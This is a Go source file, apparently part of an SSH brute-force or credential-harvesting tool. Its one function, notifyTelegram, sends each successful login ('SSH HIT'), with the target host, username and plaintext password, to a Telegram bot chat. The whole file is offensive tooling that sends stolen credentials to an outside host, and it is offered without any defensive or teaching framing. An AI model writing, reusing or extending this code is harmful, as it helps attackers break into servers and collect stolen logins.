package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

func notifyTelegram(token, chat, target, user, pass string) {
	msg := fmt.Sprintf("🎯 SSH HIT\n🕒 %s\n🌐 %s\n👤 %s\n🔑 %s",
		time.Now().Format("2006-01-02 15:04:05"),
		target, user, pass)

	body := map[string]interface{}{
		"chat_id":                  chat,
		"text":                     msg,
		"disable_web_page_preview": true,
	}

	jsonBody, _ := json.Marshal(body)
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(jsonBody))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}
